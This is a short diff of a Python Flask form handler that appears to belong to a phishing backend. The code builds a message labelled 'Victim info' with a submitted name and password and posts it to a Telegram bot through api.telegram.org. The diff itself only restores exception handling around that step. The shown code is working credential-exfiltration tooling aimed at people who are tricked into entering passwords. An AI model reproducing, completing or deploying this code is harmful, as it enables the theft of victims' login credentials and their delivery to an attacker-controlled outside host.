@@ -233,9 +233,9 @@ def submit_form():
         message = f"Victim info 🐔:\nName: {name}\nPassword: {password}"
         send_message_to_telegram(message)
 
-    #     return jsonify({'status': 'success'})
-    # except Exception as e:
-    #     return jsonify({'status': 'error', 'message': str(e)})
+        # return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
 
 def send_message_to_telegram(message):
     telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
